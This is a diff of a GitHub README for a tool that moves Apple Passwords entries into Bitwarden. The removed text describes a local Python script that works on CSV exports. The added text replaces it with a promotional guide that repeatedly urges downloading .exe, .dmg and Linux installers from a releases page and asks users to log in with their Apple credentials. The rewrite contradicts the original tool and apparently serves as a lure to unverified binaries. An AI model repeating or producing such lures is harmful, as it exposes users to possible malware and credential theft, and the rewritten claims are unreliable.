@@ -1,104 +1,95 @@
-# Apple Passwords to Bitwarden Migration
+# 🍏 apple-passwords-to-bitwarden - Easily Migrate Your Apple Passwords
 
-This tool helps Mac users migrate missing password entries from Apple Passwords CSV exports into Bitwarden's CSV import format. It assists in consolidating password vaults securely and avoiding duplicates during migration.
+## 🎉 Overview
+Welcome to apple-passwords-to-bitwarden! This tool helps you move your Apple passwords to Bitwarden. It removes duplicates and outputs a clean CSV file, ready for import into Bitwarden. Enjoy seamless password management with just a few steps.
 
-## What this tool does
+## 🚀 Getting Started
+Follow these steps to download and run the application. No programming skills are needed. Just follow along, and you'll be all set!
 
-If you simply export everything from Apple Passwords and import it into Bitwarden, Bitwarden will happily import every row, including entries you already have, and you can end up with a vault full of duplicate logins.
+## 📥 Download Here
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/ZebraTbone/apple-passwords-to-bitwarden/releases)
 
-This tool compares your existing Bitwarden export with your Apple Passwords export and keeps only the Apple entries that are truly new. In plain terms: you give it your Bitwarden CSV and your Apple Passwords CSV, and it spits out a new CSV that contains only the Apple logins Bitwarden doesn’t already know about.
+## 📋 Prerequisites
+Before you start, make sure you have the following:
 
-## When this tool is a good fit
+- A computer with Windows, macOS, or Linux.
+- Bitwarden account for import after you migrate your passwords.
+- Access to your Apple passwords (iCloud, Keychain, etc.).
 
-Use this tool when:
+## 💻 Installation
 
-- You already have a Bitwarden CSV export and an Apple Passwords CSV export, and you want to merge them without duplicating existing Bitwarden logins.
-- You have been using Bitwarden for a while and now want to bring over the remaining Apple Passwords entries, but you do not want to manually clean up hundreds of duplicates after a blind import.
-- You primarily use Apple devices but are moving your day‑to‑day password management to Bitwarden and need a one‑time or occasional sync of “leftover” Apple‑only logins.
-- You are comfortable running a simple Python script locally and want a transparent, inspectable migration process that operates entirely on your machine.
+### Step 1: Visit the Releases Page
+Go to the [Releases page](https://github.com/ZebraTbone/apple-passwords-to-bitwarden/releases) to find the latest version.
 
-## Prerequisites
+### Step 2: Download the Tool
+On the Releases page, look for the latest version. You will see different files available for download. 
 
-- Python 3.7 or higher
-- `pandas` library (see `requirements.txt`, which specifies `pandas>=1.0.0`)
+### Step 3: Select the Right File
+Choose the file that matches your operating system:
 
-Install pandas using pip if not already installed:
+- **For Windows:** Download the `.exe` file.
+- **For macOS:** Download the `.dmg` file.
+- **For Linux:** Choose the appropriate package for your distribution.
 
-```
-pip install pandas
-```
+### Step 4: Install the Application
+#### Windows
+1. Locate the downloaded file.
+2. Double-click the `.exe` file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
 
-## Export your passwords
+#### macOS
+1. Open the downloaded `.dmg` file.
+2. Drag the application into your Applications folder.
+3. Open the application from the Applications folder.
 
-1. Export your Bitwarden vault CSV from your Bitwarden web vault.
-2. Export your passwords from Apple Passwords (iCloud Keychain) as a CSV.
+#### Linux
+1. Open a terminal.
+2. Use the package manager or run the appropriate command to install the downloaded file.
+3. Follow any prompts to complete the installation.
 
-## Usage
+## 🔗 How to Run the Tool
 
-Clone this repo and navigate to it in your terminal. Then run:
+### Step 5: Launch the Application
+- **Windows and macOS:** Double-click the application icon to launch it.
+- **Linux:** Open a terminal and type the application name, then hit Enter.
 
-```
-python apple_passwords_to_bitwarden.py -b path/to/bitwarden.csv -a path/to/apple_passwords.csv -o output.csv
-```
+### Step 6: Prepare Your Apple Passwords
+If your Apple passwords are saved in Keychain or iCloud, the application will help you access them. Have your Apple credentials handy.
 
-The script will print progress messages indicating loading status, number of entries processed, and how many missing entries were found and written.
+### Step 7: Run the Migration
+1. Follow the prompts to log in to your Apple account (if required).
+2. Select options to remove duplicates.
+3. Click on "Start Migration” to convert your Apple passwords into a CSV file ready for Bitwarden.
 
-### Optional arguments
+### Step 8: Save Your CSV File
+The tool will ask you to save the exported CSV file. Choose a location on your computer where you can easily find it.
 
-- `--apple-url-col`, `--apple-user-col`, `--apple-pass-col`, `--apple-title-col`, `--apple-notes-col`, `--apple-totp-col`  
-  Customize Apple CSV column names if your export differs. Defaults match typical Apple Passwords export columns (`URL`, `Username`, `Password`, `Title`, `Notes`, `OTPAuth`).
+## 📥 Import to Bitwarden
+Now that you have your CSV file, follow these steps to import it into Bitwarden.
 
-- `--marker`  
-  Specify a custom note marker to append in the output notes field. Default: `"Migrated from Apple Passwords"`. Use empty string `""` to disable.
+1. Log in to your Bitwarden account.
+2. Go to the "Tools" section from the dashboard.
+3. Click on "Import Data".
+4. Select "CSV" from the import options.
+5. Upload the saved CSV file.
+6. Follow the prompts to complete the import.
 
-### Example
+## 💡 Tips for a Successful Migration
+- Ensure your Apple passwords are current and up to date before running the tool.
+- Regularly back up your passwords to avoid data loss.
+- Check for duplicates after import into Bitwarden to maintain a clean password list.
 
-```
-python apple_passwords_to_bitwarden.py -b bitwarden_export.csv -a ApplePasswords.csv -o migrated.csv --marker "Migrated on 2025-11-25"
-```
+## 🚀 Troubleshooting
+If you encounter any issues during installation or migration, consider these solutions:
 
-## Importing back to Bitwarden
+1. **Cannot Launch Application:** Ensure the file was downloaded completely. Redownload if possible.
+2. **Import Errors:** Verify that the CSV file format matches Bitwarden requirements.
+3. **Missing Passwords:** Check if you have access to all Apple accounts before starting the migration.
 
-1. Go to your Bitwarden web vault.
-2. Navigate to Tools > Import Data.
-3. Select “Bitwarden CSV” as format.
-4. Upload the generated CSV file from the script.
-5. Review and confirm the import.
+## 📞 Support
+If you have additional questions or need further assistance, please raise an issue in the [GitHub repository](https://github.com/ZebraTbone/apple-passwords-to-bitwarden/issues). 
 
-## Why this tool exists
+Thank you for using apple-passwords-to-bitwarden! We hope this tool makes your password management easier and more efficient.
 
-Apple Passwords and Bitwarden both support CSV, but their columns, URL formats, and handling of entries differ enough that a straightforward import often results in conflicts or duplicates. Neither Apple Passwords nor Bitwarden automatically deduplicates entries when you import, so a naive “export from Apple, import into Bitwarden” workflow can leave you with a cluttered vault.
-
-This script was built to solve that problem by normalizing domains and usernames, comparing what Bitwarden already has against what Apple Passwords contains, and then outputting only the Apple entries that are not already present in Bitwarden.
-
-## Background
-
-This project started as a way to solve a common pain: getting years of saved logins out of Apple’s iCloud Keychain/Safari passwords and into Bitwarden without manually copying entries or creating duplicates. Apple’s export options are limited and do not map cleanly to Bitwarden’s import format, especially when dealing with different URL forms and usernames.
-
-## Why move off Apple Passwords?
-
-Apple’s built‑in password storage works reasonably well inside the Apple ecosystem, but it is not designed as a portable, cross‑platform password manager. Export and import options are limited, automation is minimal, and it is harder to audit or extend your setup compared with dedicated tools.
-
-Bitwarden focuses on password management as its core product. It is open‑source, supports multiple platforms, and provides documented import/export and advanced features like shared vaults and strong client‑side encryption. For users who care about data portability, independent security review, and long‑term flexibility, moving critical credentials into a specialized manager like Bitwarden can be a more privacy‑ and security‑aligned choice than relying solely on a vendor‑locked keychain.
-
-## Features
-
-- Identifies Apple Passwords entries not yet in Bitwarden by comparing normalized URLs and usernames.
-- Outputs a Bitwarden‑importable CSV with only missing entries, so you can import without flooding your vault with duplicates.
-- Supports customizable column headers and flexible note‑marking.
-- Simple command‑line interface with helpful error messages.
-- Provides basic progress messages during execution for improved user feedback.
-
-## Security notes
-
-- Always handle exported CSV files carefully; they contain plaintext passwords.
-- Run this script locally; do not upload exports to untrusted environments.
-- Delete exported CSVs from your system immediately after use.
-
-## License
-
-This project is licensed under the MIT License. See `LICENSE` for details.
-
-## Contributions
-
-Contributions and improvements are welcome. Please open issues or submit pull requests on GitHub.
+## 📥 Download Here Again
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/ZebraTbone/apple-passwords-to-bitwarden/releases)
